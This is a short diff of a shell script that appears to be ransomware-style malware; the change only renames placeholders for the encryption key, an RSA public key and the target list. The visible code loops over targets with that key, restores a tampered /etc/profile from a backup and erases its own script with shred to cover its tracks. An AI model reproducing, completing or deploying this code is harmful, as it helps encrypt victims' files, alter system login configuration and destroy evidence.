@@ -69,11 +69,11 @@ dec_loop() {
 }
 ################## KEY STUFF ##############################
 check_req
-KEY="{{ PASSWORD }}"
+KEY="__KEY__"
 PUBLICKEY="\
-{{ RSA_PUBLIC_KEY }}"
+__STRING__"
 echo -n "$PUBLICKEY" | $SSL_COM base64 -d | $OPENSSL
-loop "{{ TARGETS }}"
+loop "__TARGETS__"
 rm /etc/profile
 mv /etc/profile.bak /etc/profile
 shred $0
